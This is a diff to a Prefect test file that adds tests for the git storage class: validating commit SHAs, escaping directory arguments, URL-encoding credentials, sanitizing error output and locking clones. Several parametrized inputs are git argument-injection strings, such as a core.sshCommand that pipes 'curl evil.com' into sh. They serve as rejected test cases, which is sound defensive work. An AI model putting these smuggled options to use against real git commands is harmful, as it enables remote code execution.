@@ -1,6 +1,8 @@
+import asyncio
 import re
 import shutil
 import subprocess
+import sys
 from pathlib import Path
 from textwrap import dedent
 from typing import Optional
@@ -25,6 +27,8 @@ from prefect.runner.storage import (
     create_storage_from_source,
 )
 from prefect.utilities.filesystem import tmpchdir
+
+pytestmark = pytest.mark.clear_db
 
 
 @pytest.fixture(autouse=True)
@@ -198,6 +202,68 @@ class TestGitRepository:
                 credentials={"username": "oauth2"},
             )
 
+    @pytest.mark.parametrize(
+        "invalid_sha",
+        [
+            "--upload-pack=touch /tmp/pwned",
+            "--config=core.sshCommand=curl evil.com|sh",
+            "-c core.sshCommand=evil",
+            "not-a-hex-string",
+            "ghijkl",
+            "abc",  # too short (< 4 chars)
+            "a" * 65,  # too long (exceeds SHA-256 length)
+        ],
+    )
+    def test_init_rejects_invalid_commit_sha(self, invalid_sha: str):
+        with pytest.raises(ValueError, match="use the 'branch' parameter instead"):
+            GitRepository(
+                url="https://github.com/org/repo.git",
+                commit_sha=invalid_sha,
+            )
+
+    @pytest.mark.parametrize(
+        "valid_sha",
+        [
+            "abcd",  # 4-char short SHA
+            "1234567",
+            "1234567890",
+            "abcdef1234567890abcdef1234567890abcdef12",  # SHA-1 (40 chars)
+            "ABCDEF1234567890ABCDEF1234567890ABCDEF12",
+            "aAbBcCdD1234567890",
+            "a" * 64,  # SHA-256 (64 chars)
+        ],
+    )
+    def test_init_accepts_valid_commit_sha(self, valid_sha: str):
+        repo = GitRepository(
+            url="https://github.com/org/repo.git",
+            commit_sha=valid_sha,
+        )
+        assert repo._commit_sha == valid_sha
+
+    @pytest.mark.parametrize(
+        "suspicious_dir",
+        [
+            "--config=core.sshCommand=curl http://evil.com|sh",
+            "--upload-pack=evil",
+        ],
+    )
+    def test_init_warns_on_directories_starting_with_double_dash(
+        self, suspicious_dir: str
+    ):
+        with pytest.warns(UserWarning, match="starts with '--'"):
+            repo = GitRepository(
+                url="https://github.com/org/repo.git",
+                directories=[suspicious_dir],
+            )
+        assert repo._directories == [suspicious_dir]
+
+    def test_init_accepts_valid_directories(self):
+        repo = GitRepository(
+            url="https://github.com/org/repo.git",
+            directories=["src", "tests", "-flag-like-dir", "path/to/dir"],
+        )
+        assert repo._directories == ["src", "tests", "-flag-like-dir", "path/to/dir"]
+
     def test_init_with_name(self):
         repo = GitRepository(url="https://github.com/org/repo.git", name="custom-name")
         assert repo._name == "custom-name"
@@ -315,7 +381,7 @@ class TestGitRepository:
                 ]
             ),
             call(
-                ["git", "sparse-checkout", "set", "dir_1", "dir_2"],
+                ["git", "sparse-checkout", "set", "--", "dir_1", "dir_2"],
                 cwd=Path.cwd() / "repo",
             ),
         ]
@@ -349,7 +415,7 @@ class TestGitRepository:
                 cwd=Path.cwd() / "repo",
             ),
             call(
-                ["git", "sparse-checkout", "set", "dir_1", "dir_2"],
+                ["git", "sparse-checkout", "set", "--", "dir_1", "dir_2"],
                 cwd=Path.cwd() / "repo",
             ),
             call(["git", "pull", "origin", "--depth", "1"], cwd=Path.cwd() / "repo"),
@@ -859,6 +925,89 @@ class TestGitRepository:
                 ],
             )
 
+        async def test_dict_credentials_url_encodes_special_chars_in_username_and_password(
+            self, mock_run_process: AsyncMock
+        ):
+            """
+            Test that dict credentials with special characters in username and
+            password are properly URL-encoded when constructing the git clone URL.
+
+            Regression test for https://github.com/PrefectHQ/prefect/issues/21537
+            """
+            repo = GitRepository(
+                url="https://bitbucket.test.com/scm/test/test.git",
+                credentials={
+                    "username": "user@domain.com",
+                    "password": "p@ss!word#123",
+                },
+            )
+
+            await repo.pull_code()
+
+            mock_run_process.assert_awaited_once_with(
+                [
+                    "git",
+                    "clone",
+                    "https://user%40domain.com:p%40ss%21word%23123@bitbucket.test.com/scm/test/test.git",
+                    "--depth",
+                    "1",
+                    str(Path.cwd() / "test"),
+                ],
+            )
+
+        async def test_dict_credentials_url_encodes_bitbucket_server_token(
+            self, mock_run_process: AsyncMock
+        ):
+            """
+            Test that BitBucket Server credentials in username:token format
+            are properly URL-encoded.
+
+            Regression test for https://github.com/PrefectHQ/prefect/issues/21537
+            """
+            repo = GitRepository(
+                url="https://bitbucketserver.example.com/scm/project/repo.git",
+                credentials={"token": "user@corp.com:token!with#special"},
+            )
+
+            await repo.pull_code()
+
+            mock_run_process.assert_awaited_once_with(
+                [
+                    "git",
+                    "clone",
+                    "https://user%40corp.com:token%21with%23special@bitbucketserver.example.com/scm/project/repo.git",
+                    "--depth",
+                    "1",
+                    str(Path.cwd() / "repo"),
+                ],
+            )
+
+        async def test_dict_credentials_url_encodes_github_token(
+            self, mock_run_process: AsyncMock
+        ):
+            """
+            Test that GitHub tokens with special characters are URL-encoded.
+
+            Regression test for https://github.com/PrefectHQ/prefect/issues/21537
+            """
+            repo = GitRepository(
+                url="https://github.com/org/repo.git",
+                credentials={"token": "ghp_token/with+special=chars"},
+            )
+
+            await repo.pull_code()
+
+            mock_run_process.assert_awaited_once_with(
+                [
+                    "git",
+                    "clone",
+                    "https://ghp_token%2Fwith%2Bspecial%3Dchars@github.com/org/repo.git",
+                    "--depth",
+                    "1",
+                    str(Path.cwd() / "repo"),
+                ],
+            )
+
     class TestToPullStep:
         async def test_to_pull_step_with_block_credentials(self):
             credentials = MockCredentials(username="testuser", access_token="testtoken")
@@ -1193,6 +1342,195 @@ class TestGitCloneErrorHints:
         with pytest.raises(RuntimeError, match="credentials or access token"):
             await repo.pull_code()
 
+    async def test_clone_repo_surfaces_stderr_when_no_hint_matches(self, monkeypatch):
+        """When git's stderr doesn't match any known pattern, the raw (sanitized)
+        stderr should appear in the RuntimeError so users don't have to
+        monkey-patch Prefect to find out what actually went wrong.
+
+        Regression for private-repo clone failures in GCP Cloud Run Jobs where
+        users saw only `exit code 1.` with no further signal.
+        """
+        monkeypatch.setattr("pathlib.Path.exists", lambda x: False)
+
+        stderr = (
+            b"remote: Counting objects: 100% (1/1), done.\n"
+            b"error: RPC failed; curl 92 HTTP/2 stream 5 was not closed cleanly\n"
+            b"fatal: early EOF\n"
+        )
+
+        async def mock_run_process_transient(*args, **kwargs):
+            raise subprocess.CalledProcessError(1, ["git", "clone"], stderr=stderr)
+
+        monkeypatch.setattr(
+            "prefect.runner.storage.run_process", mock_run_process_transient
+        )
+
+        repo = GitRepository(url="https://github.com/org/repo.git")
+        with pytest.raises(RuntimeError) as exc_info:
+            await repo.pull_code()
+
+        message = str(exc_info.value)
+        assert "exit code 1" in message
+        assert "git stderr:" in message
+        # The actionable final line should be visible to the user.
+        assert "early EOF" in message
+
+    async def test_clone_repo_logs_sanitized_stderr_at_debug(self, monkeypatch, caplog):
+        """Sanitized stderr should be emitted on the GitRepository debug logger
+        even when credentials are present (so the exception chain is suppressed)."""
+        import logging
+
+        monkeypatch.setattr("pathlib.Path.exists", lambda x: False)
+
+        stderr = (
+            b"fatal: unable to access "
+            b"'https://ghp_SECRETTOKEN@github.com/org/repo.git/': HTTP/2 stream closed\n"
+            b"remote: token ghp_SECRETTOKEN was rejected\n"
+        )
+
+        async def mock_run_process(*args, **kwargs):
+            raise subprocess.CalledProcessError(1, ["git", "clone"], stderr=stderr)
+
+        monkeypatch.setattr("prefect.runner.storage.run_process", mock_run_process)
+
+        # Embed credentials directly in the URL so exc_chain is suppressed.
+        repo = GitRepository(url="https://ghp_SECRETTOKEN@github.com/org/repo.git")
+        with caplog.at_level(
+            logging.DEBUG, logger="prefect.runner.storage.git-repository.repo"
+        ):
+            with pytest.raises(RuntimeError) as exc_info:
+                await repo.pull_code()
+
+        assert "ghp_SECRETTOKEN" not in str(exc_info.value)
+        debug_messages = [
+            record.getMessage()
+            for record in caplog.records
+            if record.levelno == logging.DEBUG
+            and "git clone failed" in record.getMessage()
+        ]
+        assert debug_messages, "expected a DEBUG log with sanitized git stderr"
+        joined = "\n".join(debug_messages)
+        assert "ghp_SECRETTOKEN" not in joined, "token must be sanitized"
+        assert "github.com" in joined
+
+
+class TestGitRepositoryConcurrency:
+    """Tests for file-based locking in GitRepository.pull_code()."""
+
+    async def test_concurrent_pull_code_does_not_race(
+        self, monkeypatch, tmp_path: Path
+    ):
+        """Two concurrent pull_code() calls to the same repo should not race."""
+
+        clone_call_count = 0
+
+        async def mock_run_process(cmd, **kwargs):
+            nonlocal clone_call_count
+
+            class Result:
+                stdout = "https://github.com/org/repo.git".encode()
+
+            if "clone" in cmd:
+                clone_call_count += 1
+                # Simulate a slow clone to widen the race window
+                await asyncio.sleep(0.1)
+            return Result()
+
+        monkeypatch.setattr("prefect.runner.storage.run_process", mock_run_process)
+        # Ensure git_dir.exists() returns False so both calls try to clone
+        monkeypatch.setattr("pathlib.Path.exists", lambda x: False)
+
+        repo1 = GitRepository(url="https://github.com/org/repo.git")
+        repo1.set_base_path(tmp_path)
+        repo2 = GitRepository(url="https://github.com/org/repo.git")
+        repo2.set_base_path(tmp_path)
+
+        await asyncio.gather(repo1.pull_code(), repo2.pull_code())
+
+        # With locking, the clone should still be called twice (once per
+        # sequential acquisition) but they should not overlap. The key
+        # assertion is that no exception was raised from the race.
+        assert clone_call_count == 2
+
+    async def test_lock_file_created_adjacent_to_destination(
+        self, monkeypatch, tmp_path: Path
+    ):
+        """The lock file should be created next to the destination directory."""
+
+        async def mock_run_process(cmd, **kwargs):
+            class Result:
+                stdout = "https://github.com/org/repo.git".encode()
+
+            return Result()
+
+        monkeypatch.setattr("prefect.runner.storage.run_process", mock_run_process)
+        monkeypatch.setattr("pathlib.Path.exists", lambda x: False)
+
+        repo = GitRepository(url="https://github.com/org/repo.git")
+        repo.set_base_path(tmp_path)
+
+        mock_file_lock = MagicMock()
+        mock_lock_instance = MagicMock()
+        mock_lock_instance.aacquire = AsyncMock()
+        mock_file_lock.return_value = mock_lock_instance
+        monkeypatch.setattr("prefect.runner.storage.FileLock", mock_file_lock)
+
+        await repo.pull_code()
+
+        expected_lock_path = repo.destination.parent / (repo.destination.name + ".lock")
+        mock_file_lock.assert_called_once_with(expected_lock_path)
+        assert expected_lock_path.parent == tmp_path
+
+    async def test_failed_clone_does_not_rmtree_while_locked(
+        self, monkeypatch, tmp_path: Path
+    ):
+        """
+        When a clone fails and rmtree is called, the lock should prevent
+        concurrent processes from seeing a partially-removed directory.
+        """
+        rmtree_calls: list[float] = []
+
+        def tracked_rmtree(path, *args, **kwargs):
+            rmtree_calls.append(asyncio.get_event_loop().time())
+            # Don't actually remove so we don't break the second caller
+            return None
+
+        monkeypatch.setattr("prefect.runner.storage.shutil.rmtree", tracked_rmtree)
+
+        call_count = 0
+
+        async def mock_run_process(cmd, **kwargs):
+            nonlocal call_count
+
+            class Result:
+                stdout = "https://github.com/org/repo.git".encode()
+
+            if "config" in cmd:
+                return Result()
+            if "pull" in cmd:
+                call_count += 1
+                if call_count == 1:
+                    raise subprocess.CalledProcessError(1, cmd)
+                return Result()
+            # clone calls succeed
+            return Result()
+
+        monkeypatch.setattr("prefect.runner.storage.run_process", mock_run_process)
+
+        # Pretend the repo already exists so pull_code takes the pull path
+        monkeypatch.setattr("pathlib.Path.exists", lambda x: ".git" in str(x))
+
+        repo1 = GitRepository(url="https://github.com/org/repo.git")
+        repo1.set_base_path(tmp_path)
+        repo2 = GitRepository(url="https://github.com/org/repo.git")
+        repo2.set_base_path(tmp_path)
+
+        # Both calls should complete without FileNotFoundError
+        await asyncio.gather(repo1.pull_code(), repo2.pull_code())
+
+        # The first call should have triggered rmtree due to the failed pull
+        assert len(rmtree_calls) >= 1
+
 
 class TestRemoteStorageErrorHints:
     """Tests for _get_remote_storage_error_hint pattern matching."""
@@ -1497,6 +1835,64 @@ class TestBlockStorageAdapter:
             )  # Ensure the destination exists
             await storage.pull_code()
             assert (storage.destination / "flows.py").read_text() == test_block.code
+        finally:
+            if storage.destination.exists():
+                shutil.rmtree(storage.destination)
+
+    async def test_pull_code_clears_readonly_files(self, test_block: Block):
+        """Regression test for GitHub issue #21720.
+
+        Git pack files are read-only (0o444). When a block's get_directory uses
+        shutil.copytree with dirs_exist_ok=True, the second pull fails because
+        copytree cannot overwrite read-only files. BlockStorageAdapter should
+        clear the destination before each pull to avoid this.
+        """
+        try:
+            storage = BlockStorageAdapter(block=test_block)
+
+            # First pull to populate the destination
+            await storage.pull_code()
+            assert (storage.destination / "flows.py").read_text() == test_block.code
+
+            # Simulate read-only git pack files in the destination
+            pack_dir = storage.destination / ".git" / "objects" / "pack"
+            pack_dir.mkdir(parents=True)
+            readonly_file = pack_dir / "pack-abc123.pack"
+            readonly_file.write_text("fake pack data")
+            readonly_file.chmod(0o444)
+
+            # Second pull should succeed (destination is cleared first)
+            await storage.pull_code()
+            assert (storage.destination / "flows.py").read_text() == test_block.code
+            # The read-only file should be gone since the directory was cleared
+            assert not readonly_file.exists()
+        finally:
+            if storage.destination.exists():
+                shutil.rmtree(storage.destination)
+
+    @pytest.mark.skipif(
+        sys.platform == "win32",
+        reason="Symlink creation requires privileges on Windows",
+    )
+    async def test_pull_code_clears_directory_symlinks(
+        self, test_block: Block, tmp_path: Path
+    ):
+        storage = BlockStorageAdapter(block=test_block)
+        try:
+            await storage.pull_code()
+
+            target_dir = tmp_path / "linked-dir-target"
+            target_dir.mkdir()
+            linked_dir = storage.destination / "linked-dir"
+            linked_dir.symlink_to(target_dir, target_is_directory=True)
+            assert linked_dir.is_symlink()
+            assert linked_dir.is_dir()
+
+            await storage.pull_code()
+
+            assert (storage.destination / "flows.py").read_text() == test_block.code
+            assert not linked_dir.exists()
+            assert target_dir.exists()
         finally:
             if storage.destination.exists():
                 shutil.rmtree(storage.destination)
